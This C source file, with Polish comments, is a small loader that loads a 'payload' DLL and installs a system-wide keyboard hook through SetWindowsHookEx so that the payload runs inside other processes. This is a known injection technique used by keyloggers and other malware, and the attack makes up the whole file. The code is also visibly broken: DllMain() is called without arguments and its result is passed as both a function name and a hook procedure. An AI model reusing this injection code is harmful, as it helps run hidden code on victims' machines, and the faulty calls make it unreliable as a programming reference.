/*LoadLibraryEx,GetProcAddress,SetWindowsHookEx*/
#include <windows.h>
#include <stdio.h>



int main(void){
//wczytanie dll-a payloadu
    WCHAR path[MAX_PATH];
    GetCurrentDirectoryW(MAX_PATH, path);
    wcscat(path, L"\\testylin.dll"); 
    HMODULE hpaydll = LoadLibraryExW(path, NULL, NULL);
    if(hpaydll == NULL){
        printf("[-] ladowanie modulu zakonczone niepowowdzeniem, blad: [%d]\n", GetLastError());
        return 1;
    }
        printf("[+] pomyslnie zaladowano modul\n");

//pobranie adresu do modulu
    //DWORD  DllMain;
    FARPROC hpayadr = GetProcAddress(hpaydll, DllMain());
    if (hpayadr == NULL){
        printf("[-] nie udalo sie pobrac adresu funkcji w dll, error [%d]\n", GetLastError());
        FreeLibrary(hpaydll);
        return 1;

    }
        printf("[+] pomyslnie pobrano adres funkcji\n");

//ustawienie zaczepu do zdarzen pochodzacych od klawiatury celem uruchomienia payloadu
    HHOOK hpayhoo = SetWindowsHookEx(WH_KEYBOARD, (HOOKPROC)DllMain(), hpaydll, 0);
    if(hpayhoo == NULL){
        printf("[-] nie udalo sie ustawic zaczepu, error [%d]\n", GetLastError());
        FreeLibrary(hpaydll);
    }
    printf("[+] pomyslnie ustawiono zaczep\n");

    
    Sleep(10 * 1000);
    UnhookWindowsHookEx(hpayhoo);
    FreeLibrary(hpaydll);
    return 0;
}
